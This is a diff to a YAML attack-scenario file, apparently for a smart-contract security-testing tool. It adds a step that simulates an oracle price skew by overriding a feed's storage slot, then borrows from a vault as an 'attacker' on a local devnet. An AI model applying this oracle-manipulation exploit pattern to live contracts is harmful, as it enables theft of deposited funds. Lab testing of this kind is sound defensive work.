@@ -133,6 +133,23 @@ steps:
           cast send "$VAULT" "deposit()" --value 1ether \
             --rpc-url http://127.0.0.1:8545 --private-key "$KEY1"
 
+  - id: simulate-skew
+    name: Confirm the attack premise by state-override simulation
+    tactic: exploit
+    precondition: simulation overrides the feed's price storage slot instead of executing the skew
+    run:
+      type: engine
+      engine: blocktack-evm
+      action: simulate-call
+      options:
+        to: "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512" # vault
+        function: "borrow(uint256)"
+        args: ["16000000000000000000"]
+        from: "0x70997970C51812dc3A010C7d01b50e0d17dc79C8" # attacker
+        state:
+          "0x5FbDB2315678afecb367f032d93F642f64180aa3": # feed
+            "0": "200000000000000" # price slot 0 -> 1000x skew
+
   - id: skew-oracle
     name: Skew the price feed 1000x
     tactic: exploit
